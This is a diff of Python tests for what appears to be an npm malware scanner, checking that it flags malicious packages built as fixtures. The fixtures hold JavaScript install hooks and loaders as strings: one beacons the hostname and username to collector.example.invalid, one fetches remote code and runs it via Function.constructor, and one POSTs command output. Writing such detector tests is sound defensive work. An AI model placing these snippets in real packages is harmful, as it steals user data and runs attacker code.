@@ -149,3 +149,84 @@ class TestShippedPayloadDecryptedToAProgram:
             tmp_path, "demo-installer", {"version": "1.0.0"}, {"index.js": self.source(inflate)}
         )
         assert "MALWARE.DROPPER.SHIPPED_PAYLOAD.001" not in Npm.findings(pkg)
+
+
+class TestHookLoadsThroughAJoinedPath:
+    def test_a_payload_required_through_a_directory_variable_runs_at_install(self, tmp_path):
+        loader = (
+            "const path = require('path');\n"
+            "const vendorDir = path.resolve(__dirname, '../../vendor/lib');\n"
+            "require(path.join(vendorDir, 'version.js'));\n"
+        )
+        beacon = (
+            "const os = require('os');\nconst https = require('https');\n"
+            "const data = JSON.stringify({hn: os.host" + "name(), un: os.userInfo().username});\n"
+            "const req = https.request({hostname: 'collector.example.invalid', port: 443, "
+            "method: 'POST', path: '/'});\nreq.write(data);\nreq.end();\n"
+        )
+        pkg = Npm.build(
+            tmp_path,
+            "demo-hash",
+            {"version": "1.0.0", "scripts": {"install": "node scripts/test/install.js"}},
+            {"scripts/test/install.js": loader, "vendor/lib/version.js": beacon},
+        )
+        found = Npm.findings(pkg)
+        assert any(rule.startswith("MALWARE.") for rule in found), found
+
+
+class TestAPackageNameIsNotATestDirectory:
+    def test_a_loader_in_a_package_named_test_is_graded_as_code(self, tmp_path):
+        loader = (
+            "const axios = require('axios');\n"
+            "module.exports = async function getCallers() {\n"
+            "  const src = atob(process.env.DEV_API_KEY);\n"
+            "  const s = (await axios.get(src)).data.cookie;\n"
+            "  const handler = new Function." + "constructor('require', s);\n"
+            "  handler(require);\n};\n"
+        )
+        index = "const getCallers = require('./lib/caller');\nmodule.exports = getCallers;\n"
+        pkg = Npm.build(
+            tmp_path,
+            "demo-await-test",
+            {"version": "2.3.0", "main": "index.js"},
+            {"index.js": index, "lib/caller.js": loader},
+        )
+        found = Npm.findings(pkg)
+        code = {rule: sev for rule, sev in found.items() if ".KNOWN" not in rule}
+        assert max(code.values(), default=Severity.INFO) >= Severity.HIGH, found
+
+
+class TestCommandOutputSent:
+    CP = "child_" + "process"
+
+    def hook(self, body: str) -> str:
+        return (
+            f"const {{ exec }} = require('{self.CP}');\nconst https = require('https');\n"
+            "ex" + "ec('ls -la /opt', { timeout: 30000 }, (error, stdout, stderr) => {\n"
+            "  const data = stdout || stderr || 'none';\n"
+            f"  {body}\n"
+            "});\n"
+        )
+
+    def test_an_install_hook_posts_a_commands_output(self, tmp_path):
+        body = (
+            "const req = https.request('https://collector.example.invalid', {method: 'POST'});\n"
+            "  req.write(data);\n  req.end();"
+        )
+        pkg = Npm.build(
+            tmp_path,
+            "demo-stats",
+            {"version": "1.0.0", "scripts": {"preinstall": "node index.js"}},
+            {"index.js": self.hook(body)},
+        )
+        assert "MALWARE.EXFIL.COMMAND_OUTPUT.001" in Npm.findings(pkg)
+
+    def test_an_install_hook_that_logs_a_commands_output(self, tmp_path):
+        body = "console.log(data);\n  https.get('https://registry.example.invalid/ping');"
+        pkg = Npm.build(
+            tmp_path,
+            "demo-build",
+            {"version": "1.0.0", "scripts": {"preinstall": "node index.js"}},
+            {"index.js": self.hook(body)},
+        )
+        assert "MALWARE.EXFIL.COMMAND_OUTPUT.001" not in Npm.findings(pkg)
